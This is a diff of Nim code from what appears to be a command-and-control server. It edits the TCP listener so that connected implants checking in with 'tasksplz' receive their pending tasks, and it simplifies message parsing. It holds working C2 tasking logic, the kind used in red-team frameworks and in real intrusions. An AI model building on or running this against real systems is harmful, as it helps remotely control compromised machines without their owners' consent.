@@ -42,12 +42,10 @@ proc `%`*(tcpListener: TCPListener): JsonNode =
 
 proc processMessages(server: C2Server, tcpListener: TCPListener, tcpSocket: TCPSocket, client: ref C2Client) {.async.} =
   
-  var msgS: string = ""
-  var linesRecv: int = 0
-  var line: string = ""
   while not tcpSocket.socket.isClosed:
+    var line: string
     try: 
-      line = await tcpSocket.socket.recvLine(maxLength=1000000)
+      line = await tcpSocket.socket.recvLine()
     except OSError: discard
 
     if line.len == 0:
@@ -57,36 +55,23 @@ proc processMessages(server: C2Server, tcpListener: TCPListener, tcpSocket: TCPS
       onClientDisconnected(client[])
       continue
 
-    inc linesRecv
-
-    msgS &= line
-    var response: JsonNode
-    try:
-      response = parseJson(decode(msgS))
-    except: 
-      if msgS == "tasksplz":
-        client.lastCheckin = now()
-        msgS = ""
-        linesRecv = 0
-        var j: JsonNode = %*[]
-        for task in client.server.tasks:
-          if task.client == client[] and task.status == TaskCreated:
-            task.status = TaskNotCompleted
-            j.add %*{
-              "task": task.action,
-              "taskId": task.id,
-              "data": task.arguments
-            }
-        onClientCheckin(client[])  
-        try:
-          await tcpSocket.socket.send(encode($j) & "\r\n")
-        except OSError: discard
+    if line == "tasksplz":
+      client.lastCheckin = now()
+      var j: JsonNode = %*[]
+      for task in client.server.tasks:
+        if task.client == client[] and task.status == TaskCreated:
+          task.status = TaskNotCompleted
+          j.add %*{
+            "task": task.action,
+            "taskId": task.id,
+            "data": task.arguments
+          }
+      onClientCheckin(client[])  
+      try:
+        await tcpSocket.socket.send(encode($j) & "\r\n")
+      except OSError: discard
       continue
-
-    msgS = ""
-    linesRecv = 0 
-
-    discard processMessage(client, response)
+    else: discard processMessage(client, line)
 
 proc createNewTcpListener*(server: C2Server, instance: ListenerInstance) {.async.} =
   let id = 1
